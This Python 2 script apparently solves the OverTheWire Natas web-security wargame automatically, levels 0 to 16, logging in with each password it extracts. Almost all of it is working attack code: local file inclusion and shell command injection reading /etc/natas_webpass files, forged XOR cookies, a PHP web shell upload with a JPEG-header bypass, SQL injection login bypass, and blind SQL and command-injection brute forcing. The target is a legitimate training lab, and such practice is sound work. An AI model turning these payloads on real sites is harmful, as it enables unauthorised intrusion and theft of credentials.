#! /usr/bin/python

import requests
import re
import binascii
import base64
import urllib
import random
import time

def xor_encrypt(text, key) :
	outText = ''
	for i, c in enumerate(text):
		outText += chr(ord(c) ^ ord(key[i % len(key)]))
	return outText

def findReapet(text) :
	textLen = len(text)
	for i in range(2, textLen) :
		for j, c in enumerate(text) :
			if (j < i) :
				continue
			if (text[j % i] != text[j]) :
				break
			if (j == textLen - 1) :
				return text[:i]

def setMform(form, bundary) :
	data = ''
	for value in form :
		data += '--' + bundary + '\n'
		data += 'Content-Disposition: form-data; name="' + value[0] + '"\n\n'
		data += value[1] + '\n'
	data += '--' + bundary + '--'
	return data

def bruteForce15(url, auth, level, debug) :
	allChars = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
	password = ''

	for local in range(1, 33) :
		if debug == 1 :
			print 'local : ' + str(local) + ', char :',
		for c in allChars :
			target = url
			target += '?username=natas' + str(level + 1) + '"'
			target += ' AND SUBSTRING(password,' + str(local) + ',1)=BINARY "' + c
			r = requests.get(target, auth=auth)
			if debug == 1 :
				print c,
			if 'exists' in r.text :
				password += c
				if debug == 1 :
					print '\nFound : ' + password
				break
	return password

def bruteForce16(url, auth, level, debug) :
	allChars = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
	parsedChars = ''
	password = ''
	existsStr = 'Output:\n<pre>\n</pre>'

	if debug == 1 :
		print 'test char in password : '
	for c in allChars :
		if debug == 1 :
			print c,
		payload = '?needle=$(grep ' + c + ' /etc/natas_webpass/natas17)whacked'
		r = requests.get(url + payload, auth=auth)
		if r.content.find(existsStr) != -1 :
			parsedChars += c;
			if debug == 1 :
				print '\nFound : ' + parsedChars
	if debug == 1 :
		print '\n'

	for local in range(1, 33) :
		if debug == 1 :
			print 'local : ' + str(local) + ', char :',
		for c in parsedChars :
			if debug == 1 :
				print c,
			payload = '?needle=$(grep ^' + password + c + ' /etc/natas_webpass/natas17)whacked'
			r = requests.get(url + payload, auth=auth)
			if r.content.find(existsStr) != -1 :
				password += c
				if debug == 1 :
					print '\nFound : ' + password
				break

	return password

def getPassword(auth, level) :
	url = 'http://natas' + str(level) + '.natas.labs.overthewire.org/'
	method = 'GET'
	headers = {}
	data = {}
	pattern = r'The password for natas' + str(level + 1) + ' is (\w+)'
	
	#level 0 and 1 is default
	if (level == 0 or level == 1) :
		data = {}
	elif level == 2 :
		url = url + 'files/users.txt'
		pattern = r'natas' + str(level + 1) + ':(\w+)'
	
	elif level == 3 :
		url = url + 's3cr3t/users.txt'
		pattern = r'natas' + str(level + 1) + ':(\w+)'
	
	elif level == 4 :
		headers = {'Referer':'http://natas' + str(level + 1) + '.natas.labs.overthewire.org/'}
	
	elif level == 5 :
		headers = {'Cookie':'loggedin=1'}
	
	elif level == 6 :
		r = requests.get(url + 'includes/secret.inc', auth=auth)
		secretP = r'\$secret = \"(\w+)\";'
		result = re.search(secretP, str(r.content))
		secret = result.group(1)
		data = {'secret':secret, 'submit':'submit'}
		method = 'POST'
	
	elif level == 7 :
		url = url + 'index.php?page=/etc/natas_webpass/natas8'
		pattern = r'<br>\s*(\w+)\s*<!--'
	
	elif level == 8 :
		r = requests.get(url + 'index-source.html', auth=auth)
		secretP = r'\$encodedSecret&nbsp;=&nbsp;\"(\w+)\";'
		result = re.search(secretP, str(r.content))
		secret = result.group(1)
		binaryStr = binascii.unhexlify(secret)
		data = {'secret':base64.b64decode(binaryStr[::-1]), 'submit':'submit'}
		method = 'POST'
	
	elif level == 9 :
		url = url + 'index.php?needle=;cat /etc/natas_webpass/natas10;&submit=Search'
		pattern = r'<pre>\s(\w+)\s</pre>'
	
	elif level == 10 :
		url = url + 'index.php?needle=. /etc/natas_webpass/natas11 #&submit=Search'
		pattern = r'/etc/natas_webpass/natas11:(\w+)'
	
	elif level == 11 :
		r = requests.get(url, auth=auth)
		dataP = r'data=(\S+)'
		result = re.search(dataP, str(r.headers['set-cookie']))
		xorKey = '{"showpassword":"no","bgcolor":"#ffffff"}'
		key = findReapet(xor_encrypt(base64.b64decode(urllib.unquote(result.group(1))), xorKey))
		payload = '{"showpassword":"yes","bgcolor":"#ffffff"}'
		cookieData = base64.b64encode((xor_encrypt(payload, key)))
		headers = {'Cookie':'data=' + cookieData}

	elif level == 12 :
		bodyData = [
		['MAX_FILE_SIZE', '1000'], 
		['filename', '1234567890.php'], 
		['uploadedfile"; filename="test.php" Content-Type: application/octet-stream', 
			'<?php echo shell_exec($_GET["e"]); ?>']
		]
		bundary = '-----------WebKitFormBoundary' + str(int(random.random()*1e10))

		r = requests.post(
			url, 
			auth=auth, 
			headers={'Content-Type' : 'multipart/form-data; boundary=' + bundary}, 
			data=setMform(bodyData, bundary)
		)

		hrefP = r'<a href=\"(\S+)\">'
		result = re.search(hrefP, str(r.content))

		url += (result.group(1) + '?e=cat /etc/natas_webpass/natas' + str(level + 1))
		pattern = r'(\w+)'
	elif level == 13 :
		bodyData = [
		['MAX_FILE_SIZE', '1000'], 
		['filename', '1234567890.php'], 
		['uploadedfile"; filename="test.php" Content-Type: application/octet-stream', 
			'\xFF\xD8\xFF\xE0<?php echo shell_exec($_GET["e"]); ?>']
		]
		bundary = '-----------WebKitFormBoundary' + str(int(random.random()*1e10))

		r = requests.post(
			url, 
			auth=auth, 
			headers={'Content-Type' : 'multipart/form-data; boundary=' + bundary}, 
			data=setMform(bodyData, bundary)
		)
		
		hrefP = r'<a href=\"(\S+)\">'
		result = re.search(hrefP, str(r.content))

		url += (result.group(1) + '?e=cat /etc/natas_webpass/natas' + str(level + 1))
		pattern = r'(\w+)'
	elif level == 14 :
		url += '?username=1" or 1=1 %23&password=1'
	elif level == 15 :
		return bruteForce15(url, auth, level, 0)
	elif level == 16 :
		return bruteForce16(url, auth, level, 0)
	else :
		return str(level + 1) + ' not work'
	
	r = requests.request(method, url, auth=auth, headers=headers, data=data)
	result = re.search(pattern, str(r.content))
	return result.group(1)

password = 'natas0'

for i in range(0, 29) :
	username = 'natas' + str(i)
	print username + ':' + password
	auth = (username, password)
	password = getPassword(auth, i)
	time.sleep(1)
